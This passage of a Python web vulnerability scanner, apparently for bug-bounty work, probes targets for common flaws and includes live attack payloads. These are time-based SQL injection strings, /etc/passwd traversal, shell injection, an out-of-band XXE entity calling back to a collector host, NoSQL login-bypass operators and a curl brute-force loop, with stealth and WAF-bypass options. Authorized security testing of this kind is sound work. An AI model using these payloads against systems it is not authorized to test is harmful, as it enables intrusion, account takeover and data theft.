                    poc=f"for i in $(seq 1 100); do curl -s -X POST '{url}' -d 'username=admin&password=guess$i'; done",
                    impact="Unlimited brute force attacks on login. Credential stuffing with no lockout.",
                    remediation="Implement rate limiting: max 5 attempts per IP per minute. Add CAPTCHA after 3 failures.",
                    confidence=85))
    return findings


def _check_cookie_flags(targets: List[str]) -> List[dict]:
    """Check for missing Secure, HttpOnly, SameSite cookie flags."""
    findings = []
    for base in targets[:20]:
        for path in ["/","/login","/api/auth"]:
            url = base.rstrip("/") + path
            r = _get(url, timeout=6)
            if not r: continue
            st, hdrs, body = r
            
            cookies = []
            if isinstance(hdrs, dict):
                set_cookie = hdrs.get("Set-Cookie","") or hdrs.get("set-cookie","")
                if isinstance(set_cookie, list):
                    cookies = set_cookie
                elif set_cookie:
                    cookies = [set_cookie]
            
            for cookie in cookies:
                cookie_lower = cookie.lower()
                name = cookie.split("=")[0].strip()
                is_session = any(kw in name.lower() for kw in 
                    ["session","token","auth","jwt","sid","csrf","user"])
                
                missing = []
                if "secure" not in cookie_lower:
                    missing.append("Secure")
                if "httponly" not in cookie_lower:
                    missing.append("HttpOnly")
                if "samesite" not in cookie_lower:
                    missing.append("SameSite")
                
                if missing and (is_session or len(missing) >= 2):
                    sev = "high" if "HttpOnly" in missing and is_session else "medium"
                    findings.append(F("misconfig", sev, url,
                        f"Cookie '{name}' missing {', '.join(missing)} flag(s)",
                        cookie_name=name, missing_flags=missing,
                        poc=f"# Check cookie: curl -I '{url}' | grep -i set-cookie",                        impact=f"{'XSS can steal session cookie (no HttpOnly). ' if 'HttpOnly' in missing else ''}{'Cookie sent over HTTP (no Secure). ' if 'Secure' in missing else ''}{'CSRF possible (no SameSite).' if 'SameSite' in missing else ''}",
                        remediation=f"Add flags to cookie: Set-Cookie: {name}=...; Secure; HttpOnly; SameSite=Strict",
                        confidence=92))
    return findings


def _check_cms_deep(targets: List[str]) -> List[dict]:
    """WordPress/Joomla/Drupal/Laravel deep vulnerability scan."""
    findings = []
    WP_PATHS = [
        ("/wp-json/wp/v2/users", "WordPress REST API user enumeration"),
        ("/wp-content/debug.log", "WordPress debug log exposed"),
        ("/wp-config.php.bak", "WordPress config backup exposed"),
        ("/?author=1", "WordPress author enumeration"),
        ("/wp-login.php", "WordPress login panel"),
        ("/xmlrpc.php", "WordPress XML-RPC enabled (brute force vector)"),
        ("/wp-admin/", "WordPress admin panel"),
        ("/.env", "Laravel .env file exposed"),
        ("/storage/logs/laravel.log", "Laravel log file exposed"),
        ("/api/swagger", "API docs exposed"),
        ("/telescope", "Laravel Telescope exposed"),
        ("/horizon", "Laravel Horizon exposed"),
        ("/administrator/", "Joomla admin panel"),
        ("/user/login", "Drupal login"),
        ("/CHANGELOG.txt", "CMS version disclosure"),
        ("/LICENSE.txt", "CMS version disclosure"),
        ("/readme.html", "WordPress readme (version)"),
    ]
    
    for base in targets[:20]:
        for path, desc in WP_PATHS:
            url = base.rstrip("/") + path
            r = _get(url, timeout=7)
            if not r: continue
            st, hdrs, body = r
            
            if st == 200 and len(body) > 50:
                sev = "critical" if any(kw in body.lower() for kw in 
                    ["db_password","secret_key","app_key","database_url","password="]) else                       "high" if any(kw in body for kw in 
                    ['"id":','username','admin',"APP_KEY","DB_","MAIL_PASSWORD"]) else "medium"
                
                findings.append(F("expose", sev, url, desc,
                    preview=body[:300],
                    poc=f"curl '{url}'",
                    impact=f"{'Credentials exposed. ' if 'critical' in sev else ''}Attack surface expanded via {desc}.",
                    remediation="Restrict access to this path. Disable debug mode. Remove backup files.",
                    confidence=90))
    return findings


def _check_response_diff(targets: List[str], endpoints: List[str]) -> List[dict]:
    """Detect blind injection via response diffing (time + size)."""
    findings = []
    DIFF_PAYLOADS = [
        ("sqli_time",  "' AND SLEEP(5)-- -",    "' AND SLEEP(0)-- -",  "time"),
        ("sqli_time",  "1; WAITFOR DELAY '0:0:5'--", "1",              "time"),
        ("lfi",        "../../../etc/passwd",    "invalid_path_xyz",    "size"),
        ("ssti",       "{{7*7}}",               "{{invalid}}",         "content"),
        ("rce",        "; sleep 5",             "; echo test",         "time"),
    ]
    
    for ep in endpoints[:30]:
        if "?" not in ep: continue
        base, qs = ep.split("?",1)
        import urllib.parse as _up
        params = _up.parse_qs(qs)
        if not params: continue
        
        param = list(params.keys())[0]
        orig_r = _get(ep, timeout=8)
        if not orig_r or orig_r[0] != 200: continue
        
        for bug_type, evil_payload, benign_payload, diff_type in DIFF_PAYLOADS[:2]:
            try:
                evil_url   = f"{base}?{param}={_up.quote(evil_payload, safe='')}"
                benign_url = f"{base}?{param}={_up.quote(benign_payload, safe='')}"
                
                import time as _t
                t0 = _t.time()
                r_evil = _get(evil_url, timeout=12)
                evil_time = _t.time() - t0
                
                t0 = _t.time()
                r_benign = _get(benign_url, timeout=8)
                benign_time = _t.time() - t0
                
                if diff_type == "time" and evil_time > benign_time + 4:
                    findings.append(F(bug_type, "high", evil_url,
                        f"Blind {bug_type.upper()} via time-based response diff",
                        param=param, payload=evil_payload,
                        time_evil=round(evil_time,2), time_benign=round(benign_time,2),
                        poc=f"# Evil (slow): curl '{evil_url}' # Benign (fast): curl '{benign_url}'",
                        impact="Blind SQL injection confirmed. Database extraction possible without error output.",
                        remediation="Use parameterized queries. Never concatenate user input into SQL.",
                        confidence=90))
                elif diff_type == "size" and r_evil and r_benign:
                    size_diff = abs(len(r_evil[2]) - len(r_benign[2]))
                    if size_diff > 200 and r_evil[0] == 200:
                        findings.append(F(bug_type, "medium", evil_url,
                            f"Possible {bug_type.upper()} via response size diff (+{size_diff}b)",
                            param=param, payload=evil_payload, size_diff=size_diff,
                            poc=f"curl '{evil_url}'",
                            impact="Response differs significantly with path traversal payload.",
                            remediation="Validate and sanitize all path parameters.",
                            confidence=65))
            except Exception:
                pass
    return findings


def _check_xxe_oob(targets: List[str], endpoints: List[str]) -> List[dict]:
    """Out-of-band XXE via OOB DNS/HTTP callback."""
    findings = []
    oob_host = _get_oob_host() or "OOBHOST"
    
    OOB_XXE = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{oob_host}/xxe_test">
  %xxe;
]>
<root><test>xxe_probe</test></root>"""
    
    XML_ENDPOINTS = [ep for ep in endpoints if any(
        p in ep.lower() for p in ["/xml","/soap","/api","/upload","/import","/parse"])][:20]
    
    for ep in XML_ENDPOINTS:
        try:
            r = _req(ep, method="POST", data=OOB_XXE,
                     headers={"Content-Type":"application/xml","Accept":"*/*"}, timeout=10)
            if not r: continue
            st, hdrs, body = r
            # Check for XML parsing errors (entity processed)
            if any(s in body for s in ["XML","entity","DTD","SYSTEM","parse","<!DOCTYPE"]):
                findings.append(F("xxe","high", ep,
                    "Possible OOB XXE — XML parser may process external entities",
                    poc=f"# OOB XXE test: curl -X POST '{ep}' -H 'Content-Type: application/xml' -d '{OOB_XXE[:100]}...'",
                    impact="Out-of-band XXE can exfiltrate internal files, SSRF to internal services.",
                    remediation="Disable XML external entities. Use safe XML parsers.",
                    confidence=65))
        except Exception:
            pass
    return findings


def _check_nosqli_deep(targets: List[str], endpoints: List[str]) -> List[dict]:
    """Deep NoSQL injection — MongoDB, Redis, ElasticSearch operators."""
    findings = []
    NOSQLI_PAYLOADS = [
        ('{"$gt":""}', "MongoDB $gt operator injection"),
        ('{"$ne":null}', "MongoDB $ne operator injection"),
        ('{"$regex":".*"}', "MongoDB $regex injection"),
        ('{"$where":"1==1"}', "MongoDB $where injection"),
        ('[$ne]=1', "NoSQL array injection bypass"),
        ('[$gt]=', "NoSQL $gt array bypass"),
        ('{"$or":[{},{"a":"a"}]}', "MongoDB $or injection"),
    ]
    
    for ep in endpoints[:30]:
        base = ep.split("?")[0]
        for payload, desc in NOSQLI_PAYLOADS[:3]:
            for param in ["username","user","email","id","login","search","q"]:
                try:
                    # JSON body injection
                    test_data = f'{{"{param}":{payload},"password":"x"}}'
                    r = _req(base, method="POST", data=test_data,
                             headers={"Content-Type":"application/json"}, timeout=8)
                    if not r: continue
                    st, hdrs, body = r
                    
                    # Success indicators
                    if st in [200,302] and any(s in body.lower() for s in
                        ["welcome","dashboard","token","success","logged","user","admin"]):
                        findings.append(F("nosqli","critical", base,
                            f"NoSQL Injection — {desc}",
                            param=param, payload=payload,
                            poc=f"curl -X POST '{base}' -H 'Content-Type: application/json' -d '{test_data}'",
                            impact="Authentication bypass via NoSQL operator injection. Login as any user.",
                            remediation="Sanitize input, reject MongoDB operators. Use allowlist validation.",
                            confidence=90))
                except Exception:
                    pass
    return findings


def _check_http_desync(targets: List[str]) -> List[dict]:
    """HTTP request desync / smuggling probe."""
    findings = []
    # Simple detection: look for TE-CL or CL-TE discrepancies
    for base in targets[:10]:
        for path in ["/","/api","/login"]:
            url = base.rstrip("/") + path
            try:
                # Send a CL.TE probe
                probe_host = base.split("//")[-1] if "//" in base else base
                probe = "POST " + path + " HTTP/1.1\r\nHost: " + probe_host + "\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX"

                r = _get(url, headers={
                    "Transfer-Encoding": "chunked",
                    "Content-Length": "6"
                }, timeout=10)
                if r and r[0] in [400, 408, 500]:
                    if any(s in r[2].lower() for s in ["invalid","bad request","chunked","smuggl"]):
                        findings.append(F("smuggling","high", url,
                            "Possible HTTP Request Smuggling — server shows desync indicators",
                            poc=f"# Use smuggler.py or turbo-intruder to confirm: python3 smuggler.py -u '{url}'",
                            impact="HTTP smuggling can bypass WAF, hijack sessions, poison caches.",
                            remediation="Enforce consistent HTTP parsing. Use HTTP/2 end-to-end. Disable backend keep-alive.",
                            confidence=60))
            except Exception:
                pass
    return findings


def _check_open_api_fuzz(targets: List[str], endpoints: List[str]) -> List[dict]:
    """Fuzz endpoints discovered via OpenAPI/Swagger schema."""
    findings = []
    # Find API endpoints and test for common issues
    api_eps = [e for e in endpoints if any(p in e.lower() for p in ["/api/","/v1/","/v2/","/v3/"])][:30]
    
    for ep in api_eps:
        # Test for BOLA/IDOR on numeric IDs
        import re as _re
        id_match = _re.search(r'/(\d+)(?:/|$|\?)', ep)
        if id_match:
            orig_id = id_match.group(1)
            for test_id in [str(int(orig_id)+1), str(int(orig_id)-1), "0", "1", "99999"]:
                test_url = ep.replace(f"/{orig_id}", f"/{test_id}", 1)
                r = _get(test_url, timeout=6)
                if r and r[0] == 200 and len(r[2]) > 100:
                    if test_id != orig_id:
                        findings.append(F("idor","info", test_url,
                            f"BOLA/IDOR — accessing resource ID {test_id} without ownership",
                            original_id=orig_id, accessed_id=test_id,
                            poc=f"curl '{test_url}'",
                            impact="Access any user's data by iterating IDs. Mass data exfiltration.",
                            remediation="Implement object-level authorization. Verify ownership before returning data.",
                            confidence=75))
                        break
    return findings


def run_scan(domain:str, bugs:List[str], q:queue.Queue, db,
             auth_session=None, stealth_mode:str="normal",
             auto_select:bool=True, scan_speed:str="normal"):
    """
    ELITE scan: auth-aware, WAF-bypass, stealth, OOB, notifications,
    fingerprint-based auto bug selection. scan_speed: fast|normal|thorough
    """
    # ── TASK 5/6 — Watchdog registration ──────────────────────────────────────
    try:
        from engine.runtime_watchdog import (
            stage_start as _wdog_start, stage_done as _wdog_done,
            stage_fail as _wdog_fail, clear_domain_stages,
            record_scan_duration
        )
        _wdog_enabled = True
        clear_domain_stages(domain)
        _scan_t0 = time.time()
    except Exception:
        _wdog_enabled = False
        _scan_t0 = time.time()
        def _wdog_start(d,s): pass
        def _wdog_done(d,s): pass
        def _wdog_fail(d,s,e=""): pass
        def record_scan_duration(s): pass

    # ── Domain validation — hard stop for invalid input ────────────────────────
    import re as _re_scan
    _dom_clean = (domain or "").strip().lower()
    _dom_clean = _re_scan.sub(r'^https?://', '', _dom_clean).split('/')[0].split('?')[0]
    if _re_scan.search(r'[;|&<>"\' \t\n\r\x00-\x1f]', _dom_clean) or \
       not _re_scan.match(r'^[a-z0-9][a-z0-9.\-]*\.[a-z]{2,}$', _dom_clean):
        log.error(f"[scan] REJECTED invalid domain: {domain!r}")
        q.put({"type":"error","msg":f"Invalid domain: {domain!r} — scan aborted"})
        q.put({"type":"done"})
        return
    log.info(f"[scan] domain validated: {domain}")
    # For concurrent safety each run_scan gets its own local references
    # (globals kept for legacy compat but isolated per call via local vars)

    # Speed multipliers -- affect endpoint caps and payload counts
    SPEED = {
        "fast":     {"ends_mul":0.5,  "workers":8,  "timeout_mul":0.6},
        "normal":   {"ends_mul":1.0,  "workers":8,  "timeout_mul":1.0},
        "thorough": {"ends_mul":2.0,  "workers":6,  "timeout_mul":1.5},
    }.get(scan_speed, {"ends_mul":1.0,"workers":12,"timeout_mul":1.0})

    # Hard caps — prevent runaway scans
    MAX_ENDPOINTS    = int(5000 * SPEED["ends_mul"])
    MAX_FINDINGS     = 5000       # stop saving after 5000 findings per scan
    MAX_REQUESTS     = 50000      # global request counter cap
    _req_count       = [0]        # mutable for closure access
    _finding_count   = [0]

    log.info(f"[scan] speed={scan_speed} workers={SPEED['workers']} ends_mul={SPEED['ends_mul']}")
    # Per-domain stop event — clear first, then get fresh event (order matters)
    _clear_stop_event(domain)      # replace with a fresh, unset event
    _domain_stop = _get_stop_event(domain)  # now captures the fresh event
    # NOTE: do NOT clear global _scan_stop here — that would reset stop state
    # for ALL other concurrent scans running in parallel

    # Per-domain rate limiter (default 15 req/s, respects stealth mode)
    _rps = {"fast": 25.0, "normal": 15.0, "thorough": 8.0, "stealth": 3.0}.get(stealth_mode, 15.0)
    _rate_limiter = _get_rate_limiter(domain, rps=_rps)
    log.info(f"[scan] rate limit: {_rps} req/s for {domain}")

    # ── Setup engines (local vars for thread safety in concurrent scans) ──
    # Write ONLY to thread-local — never touch module globals.
    # Concurrent batch scans each run in their own thread,
    # so _tl is isolated per scan. No cross-target leakage.
    _tl.auth_session   = auth_session
    _tl.waf_info       = _get_waf(domain, db)
    _tl.stealth_engine = _get_stealth()
    if _tl.stealth_engine:
        _tl.stealth_engine.set_mode(stealth_mode)
    notifier  = _get_notifier()
    oob       = _get_oob()

    # ── Load data ──────────────────────────────────────────────────────────
    hosts  = db.get_hosts(domain)
    lives  = hosts.get("active",[])
    subs   = hosts.get("subs",[])
    _raw_ends = db.get_endpoints(domain, limit=20000)

    # Deduplicate endpoints: strip cache-busting params (?rand=, ?v=, ?_=)
    # Prevents scanning app.js?rand=001 and app.js?rand=002 as separate files
    _CACHE_KS = {'rand','_','v','ver','version','cb','cache','ts','t','nocache','nc','bust','rev'}
    _seen_n = set()
    ends = []
    for _ep in _raw_ends:
        try:
            _p = urllib.parse.urlparse(_ep)
            if _p.query:
                _qs = urllib.parse.parse_qs(_p.query, keep_blank_values=True)
                _qs_c = {k: v for k, v in _qs.items() if k.lower() not in _CACHE_KS}
                _norm = urllib.parse.urlunparse(_p._replace(
                    query=urllib.parse.urlencode(_qs_c, doseq=True)))
            else:
                _norm = _ep
        except Exception:
            _norm = _ep
        if _norm not in _seen_n:
            _seen_n.add(_norm)
            ends.append(_ep)
    if len(_raw_ends) != len(ends):
        log.info(f"[scan] dedup: {len(_raw_ends)}→{len(ends)} endpoints ({len(_raw_ends)-len(ends)} cache-param dups removed)")

    # ── CRITICAL: Remove relative URLs (no hostname) — they cause DNS failures ──
    _before_rel = len(ends)
    ends = [e for e in ends
            if urllib.parse.urlparse(e).netloc
            and urllib.parse.urlparse(e).scheme in ('http', 'https')]
    _removed_rel = _before_rel - len(ends)
    if _removed_rel:
        log.info(f"[scan] removed {_removed_rel} endpoints with invalid hostnames")

    # ── SMART DEDUP: Semantic URL deduplication /users/123 = /users/456 ──────
    try:
        if _ELITE_ENGINES:
            _before_smart = len(ends)
            ends = deduplicate_endpoints(ends)
            _removed_smart = _before_smart - len(ends)
            if _removed_smart:
                log.info(f"[scan] semantic dedup: removed {_removed_smart} duplicate endpoints")
            # Sort by priority: high-value endpoints first
            ends = sorted(ends, key=score_endpoint_priority, reverse=True)
    except Exception as _sde:
        log.debug(f"[scan] smart_dedup: {_sde}")

    # ── SCOPE: Remove out-of-scope URLs (e.g. iso.org in hackerone.com scan) ──
    _target_root = domain.lower().lstrip("www.")
    _before_scope = len(ends)
    ends = [e for e in ends if
            urllib.parse.urlparse(e).netloc.lower().rstrip(".")
                .endswith("." + _target_root)
            or urllib.parse.urlparse(e).netloc.lower().rstrip(".") == _target_root
            or urllib.parse.urlparse(e).netloc.lower().rstrip(".") == "www." + _target_root]
    _removed_scope = _before_scope - len(ends)
    if _removed_scope:
        log.info(f"[scan] removed {_removed_scope} out-of-scope endpoints (not subdomain of {domain})")

    # ── SCOPE MANAGER: apply program-level include/exclude rules ──────────────
    try:
        _scope_meta = db.get_meta(domain) or {}
        _scope_dict = _scope_meta.get("scope", {})
        if _scope_dict.get("includes") or _scope_dict.get("excludes"):
            from engine.scope_manager import ScopeManager as _SM
            _sm = _SM.from_dict(_scope_dict)
            _before_sm = len(ends)
            ends = [e for e in ends if _sm.is_in_scope(e)]
            _removed_sm = _before_sm - len(ends)
            if _removed_sm:
                log.info(f"[scan] scope rules removed {_removed_sm} endpoints "
                         f"(includes={_scope_dict.get('includes',[])} "
                         f"excludes={_scope_dict.get('excludes',[])})")
            # Also filter targets list
            targets = [t for t in targets if _sm.is_in_scope(t)]
    except Exception as _sme:
        log.debug(f"[scan] scope manager: {_sme}")

    # ── Streaming wait: if recon is running in parallel and has not written any
    # endpoints yet, wait up to 30s for the first batch before starting bug checks.
    if not ends and db:
        log.info("[stream] 0 endpoints at scan start — waiting up to 30s for parallel recon to populate DB")
        import time as _stream_wait_t
        _sw_deadline = _stream_wait_t.monotonic() + 30
        while _stream_wait_t.monotonic() < _sw_deadline:
            _stream_wait_t.sleep(2)
            _stream_raw = db.get_endpoints(domain, limit=20000)
            if _stream_raw:
                log.info(f"[stream] got first {len(_stream_raw)} endpoints from DB after "
                         f"{30 - int(_sw_deadline - _stream_wait_t.monotonic())}s wait — proceeding")
                # Re-run dedup on fresh batch
                for _sw_ep in _stream_raw:
                    try:
                        _p2 = urllib.parse.urlparse(_sw_ep)
                        if _p2.query:
                            _qs2 = urllib.parse.parse_qs(_p2.query, keep_blank_values=True)
                            _qs2c = {k: v for k, v in _qs2.items() if k.lower() not in _CACHE_KS}
                            _n2 = urllib.parse.urlunparse(_p2._replace(query=urllib.parse.urlencode(_qs2c, doseq=True)))
                        else:
                            _n2 = _sw_ep
                    except Exception:
                        _n2 = _sw_ep
                    if _n2 not in _seen_n:
                        _seen_n.add(_n2)
                        ends.append(_sw_ep)
                break

    # ── Phase 2: File fallback — if DB still empty, load from exported files ──
    _used_file_fallback = False
    if not ends:
        try:
            from pathlib import Path as _FBPath
            _export_dir = _FBPath(__file__).parent / "data" / "exports" / domain
            if _export_dir.exists():
                _file_urls: list = []
                # Load from crawled.txt first (all URLs), then category files
                for _fname in ["crawled.txt", "params.txt", "api.txt",
                               "sqli.txt", "xss.txt", "ssrf.txt", "lfi.txt"]:
                    _fp = _export_dir / f"{domain}_{_fname}"
                    if _fp.exists():
                        for _line in _fp.read_text(errors="replace").splitlines():
                            _line = _line.strip()
                            if _line.startswith("http") and _line not in _seen_n:
                                _seen_n.add(_line)
                                _file_urls.append(_line)
                if _file_urls:
                    ends = _file_urls
                    _used_file_fallback = True
                    log.info(
                        f"[scanner] endpoints_loaded_db=0"
                        f" fallback_files={len(ends)}"
                        f" source={_export_dir}"
                    )
                    # Also write back to DB so nuclei and future scans benefit
                    _written_back = 0
                    for _fb_url in ends[:10000]:
                        if db.add_endpoint(domain, _fb_url, source="file_fallback"):
                            _written_back += 1
                    log.info(f"[scanner] wrote {_written_back} endpoints back to DB from files")
        except Exception as _fb_err:
            log.warning(f"[scanner] file fallback failed: {_fb_err}")

    if not ends:
        log.warning("[scan] no_endpoints — recon produced 0 endpoints for this domain")
        log.info("[scan] scanner will attempt nuclei on live hosts only (no endpoint-level checks)")
    else:
        _src = "file_fallback" if _used_file_fallback else "db"
        log.info(f"[scanner] endpoints_loaded_db={0 if _used_file_fallback else len(ends)}"
                 f" source={_src} total={len(ends)}")

    # ── H1 Intelligence: score-based endpoint prioritisation ─────────────────
    # Sort endpoints by H1 confidence score (frequency × severity × recency × breadth).
    # High-scoring paths — those seen across many programs with high severity — are
    # tested first. Falls back to raw frequency if scoring engine unavailable.
    # Score map stored in _tl so per-endpoint hints remain accessible during scan.
    _tl.h1_score_map = {}
    try:
        from engine.h1_intel import get_scored_endpoints
        from engine.h1_ingest import _normalise_endpoint as _h1_norm
        _scored = get_scored_endpoints(limit=300)
        _tl.h1_score_map = {p["value"]: p["score"] for p in _scored}
        if _tl.h1_score_map and ends:
            def _h1_score(url: str) -> float:
                try:
                    from urllib.parse import urlparse as _up
                    norm = _h1_norm(_up(url).path)
                    return _tl.h1_score_map.get(norm, 0.0)
                except Exception:
                    return 0.0
            ends.sort(key=_h1_score, reverse=True)
            scored_count = sum(1 for u in ends if _h1_score(u) > 0)
            log.info(f"[scan] H1-prioritised {len(ends)} endpoints "
                     f"({scored_count} with H1 score >0, "
                     f"max={max(_tl.h1_score_map.values(), default=0):.1f})")
    except Exception as _h1e:
        log.debug(f"[scan] H1 score-priority: {_h1e}")

    # ── Apply scope filtering ─────────────────────────────────────────────────
    try:
        _scope_meta = db.get_meta(domain) or {}
        _scope_dict = _scope_meta.get("scope", {})
        if _scope_dict.get("includes") or _scope_dict.get("excludes"):
            from engine.scope_manager import ScopeManager
            _sm   = ScopeManager.from_dict(_scope_dict)
            before = len(ends)
            ends   = _sm.filter_urls(ends)
            lives  = _sm.filter_hosts(lives)
            log.info(f"[scope] filtered {before}→{len(ends)} endpoints, {len(lives)} hosts in-scope")
            q.put({"type":"log","msg":f"Scope: {len(ends)} in-scope endpoints","status":"ok"})
    except Exception as _se:
        log.debug(f"[scope] filter error: {_se}")

    # ── Load saved auth session if none provided ──────────────────────────
    if not auth_session:
        try:
            saved = db.get_auth(domain) or {}
            if saved.get("cookie") or saved.get("token"):
                from engine.auth import Session as _AuthSession
                auth_session = _AuthSession()
                _cookie = saved.get("cookie","")
                _token  = saved.get("token","")
                if _cookie:
                    auth_session.set_cookies(_cookie)   # parses "name=val; name2=val2" properly
                if _token:
                    auth_session.set_token(_token, saved.get("token_type","Bearer"))
                auth_session.logged_in = True
                log.info(f"[scan] loaded saved auth session for {domain} "
                         f"(cookie={'yes' if _cookie else 'no'} "
                         f"token={'yes' if _token else 'no'})")
        except Exception as _ae:
            log.debug(f"[scan] auth load: {_ae}")

    targets = list(set(lives))
    targets = [t for t in targets if t.startswith("http")]
    if not targets:
        targets = [f"https://{s}" for s in subs[:100]]

    # ── Fetch tech stack from DB for tech-aware nuclei scanning ───────────────
    _scan_tech = []
    try:
        _tech_raw = db.get_tech(domain) or []
        _scan_tech = [t.lower() for t in _tech_raw if t] if _tech_raw else []
        if _scan_tech:
            log.info(f"[scan] tech stack for nuclei: {_scan_tech[:10]}")
    except Exception as _te:
        log.debug(f"[scan] tech fetch: {_te}")

    # ── If still no targets, probe the domain directly ─────────────────────
    # This handles the case where user clicks Scan without running Recon first
    if not targets:
        log.info(f"[scan] no recon data for {domain} -- probing directly")
        q.put({"type":"step","name":"auto_probe","state":"run",
               "meta":"No recon data -- probing domain directly"})
        _probe_targets = []
        for scheme in ["https", "http"]:
            url = f"{scheme}://{domain}"
            try:
                r = _get(url, timeout=8)
                if r and r[0] < 500:
                    _probe_targets.append(url)
                    break
            except: pass
        # Also try www.
        if not _probe_targets:
            for scheme in ["https", "http"]:
                url = f"{scheme}://www.{domain}"
                try:
                    r = _get(url, timeout=8)
                    if r and r[0] < 500:
                        _probe_targets.append(url)
                        break
                except: pass
        if _probe_targets:
            targets = _probe_targets
            # Add basic endpoints
            base = targets[0]
            for path in ["/", "/api", "/api/v1", "/login", "/admin", "/graphql",
                          "/health", "/actuator", "/swagger-ui.html", "/robots.txt"]:
                ends.append(base.rstrip("/") + path)
            log.info(f"[scan] probed {domain} → {targets}")
            q.put({"type":"step","name":"auto_probe","state":"done",
                   "meta":f"Found: {targets[0]}"})
        else:
            log.warning(f"[scan] {domain} did not respond -- scan will have limited results")
            q.put({"type":"step","name":"auto_probe","state":"done",
                   "meta":"Domain unreachable -- run Recon first for best results"})

    # ── Fingerprint-based auto bug selection ───────────────────────────────
    if auto_select:
        try:
            from engine.fingerprint import auto_select_bugs_from_db
            fp = auto_select_bugs_from_db(domain, db)
            # Merge fingerprint bugs with requested bugs
            fp_bugs = fp.get("bugs", [])
            priority = fp.get("priority_bugs", [])
            reasons  = fp.get("reasons", [])
            # Log fingerprint reasoning
            for r in reasons[:5]:
                log.info(f"[fingerprint] {r}")
                q.put({"type":"step","name":"fingerprint","state":"run","meta":r})
            # Add fingerprint bugs to scan list (deduped)
            merged = list(dict.fromkeys(priority + bugs + fp_bugs))
            if merged != bugs:
                log.info(f"[fingerprint] expanded {len(bugs)} → {len(merged)} bug types")
                bugs = merged
        except Exception as e:
            log.warning(f"fingerprint auto-select: {e}")

    # ── OOB host for blind detection ───────────────────────────────────────
    oob_host = ""
    if oob:
        oob_host = oob.host
        log.info(f"[oob] using host: {oob_host}")
        q.put({"type":"step","name":"oob","state":"done","meta":f"OOB: {oob_host}"})
    else:
        q.put({"type":"step","name":"oob","state":"skip","meta":"no OOB host configured"})

    log.info(f"[scan] {domain} | targets:{len(targets)} | endpoints:{len(ends)} "
             f"| bugs:{len(bugs)} | auth:{bool(getattr(_tl,'auth_session',None) and getattr(_tl,'auth_session').logged_in)} "
             f"| waf:{_waf_info.get('vendor','none')} | stealth:{stealth_mode}")
    # Pre-Scan ('test') step — resolves once we know how many targets/endpoints exist
    if ends or targets:
        q.put({"type":"step","name":"test","state":"done",
               "meta":f"endpoints={len(ends)} targets={len(targets)}"})
    else:
        q.put({"type":"step","name":"test","state":"skip",
               "meta":"no_targets — scan will check live hosts only"})
    _nuclei_ok = bool(shutil.which("nuclei") or any(
        os.path.isfile(os.path.join(d, "nuclei"))
        for d in [os.path.expanduser("~/go/bin"), "/home/kali/go/bin", "/usr/local/bin"]
    ))
    log.info(f"[pre_scan] done endpoints={len(ends)} live_hosts={len(targets)} nuclei_ready={_nuclei_ok}")

    # Smart param injection -- build testable parameterized URLs from discovered endpoints
    # Injectable endpoints: has '=' AND is not a static asset
    # Static assets with ?v=1.0.0 would falsely count as parameterized and suppress injection
    _STATIC_EXTS = ('.css', '.js', '.png', '.jpg', '.jpeg', '.ico', '.woff',
                    '.woff2', '.ttf', '.svg', '.gif', '.webp', '.map', '.json.map')
    _STATIC_PARAMS = {'v', 'ver', 'version', 'cb', 'ts', 't', 'rev', 'bust', 'nocache', '_'}
    def _valid_url_host(url: str) -> bool:
        """Reject URLs whose hostname contains invalid characters (typos, injections)."""
        try:
            import urllib.parse as _up
            host = _up.urlparse(url).netloc.split(":")[0].lower()
            import re as _re
            return bool(host and _re.match(r'^[a-z0-9][a-z0-9.\-]*\.[a-z]{2,}$', host))
        except Exception:
            return False

    def _is_injectable(url: str) -> bool:
        if '=' not in url: return False
        if any(url.lower().split('?')[0].endswith(ext) for ext in _STATIC_EXTS): return False
        try:
            import urllib.parse as _up
            qs = _up.parse_qs(_up.urlparse(url).query)
            # Must have at least one non-cache-busting param
            return any(k.lower() not in _STATIC_PARAMS for k in qs)
        except Exception:
            return True

    # Validate all endpoint URLs — reject malformed hostnames before any scanning
    _invalid_ends = [e for e in ends if not _valid_url_host(e)]
    if _invalid_ends:
        log.warning(f"[scan] removed {len(_invalid_ends)} endpoints with invalid hostnames "
                    f"(e.g. {_invalid_ends[0][:60]})")
    ends = [e for e in ends if _valid_url_host(e)]

    param_ends = [e for e in ends if _is_injectable(e)]
    log.info(f"[scan] {len(param_ends)}/{len(ends)} endpoints have injectable params")

    # Only generate synthetic test URLs when we have REAL discovered endpoints.
    # If recon produced 0 endpoints, there is nothing to test — do not fabricate targets.
    _has_real_endpoints = len(ends) > 0
    if len(param_ends) < 100 and _has_real_endpoints:
        log.info(f"[scan] few parameterized endpoints ({len(param_ends)}) -- augmenting with test params on discovered paths")
        INJECT_PARAMS = [
            ("id",       ["1","2","100"]),
            ("page",     ["1","2"]),
            ("q",        ["test"]),
            ("search",   ["test"]),
            ("query",    ["test"]),
            ("file",     ["test"]),
            ("path",     ["test"]),
            ("url",      ["http://test.com"]),
            ("redirect", ["http://test.com"]),
            ("lang",     ["en"]),
            ("cat",      ["1"]),
            ("name",     ["test"]),
            ("user",     ["admin"]),
            ("token",    ["test"]),
        ]
        injected = []
        _ends_set = set(ends)

        # Take discovered paths and add test params — 300 paths for better coverage
        discovered_paths = list(set(
            e for e in ends
            if e.startswith("http") and "=" not in e
            and not e.endswith((".css",".js",".png",".jpg",".ico",".woff",".woff2",".ttf",".map"))
        ))[:300]

        for base_url in discovered_paths:
            for param, vals in INJECT_PARAMS[:8]:
                for val in vals[:1]:
                    u = f"{base_url}?{param}={val}"
                    if u not in _ends_set:
                        injected.append(u)
                        _ends_set.add(u)
                if len(injected) >= 2400: break
            if len(injected) >= 2400: break

        # Also inject on live host root paths
        for target in targets[:30]:
            for param, vals in INJECT_PARAMS:
                u = f"{target.rstrip('/')}?{param}={vals[0]}"
                if u not in _ends_set:
                    injected.append(u)
                    _ends_set.add(u)

        # ── CRITICAL: put injected URLs at FRONT of ends, not back ────────────
        # end_cap = ends[:cap_n] — injected must be reachable within the cap.
        # We prepend injected to ends so they appear in position 0..N.
        # The H1 score-sort already ran; injected URLs get score 0 which puts them
        # after scored endpoints but before the rest of the unscored bulk.
        # Solution: insert injected immediately after any H1-scored endpoints.
        if injected:
            # Place injected URLs directly after any H1-scored endpoints.
            # h1_score_map is keyed by normalised path (set at line ~7476).
            _score_map_inj = getattr(_tl, 'h1_score_map', {})
            if _score_map_inj:
                _scored_front = [e for e in ends
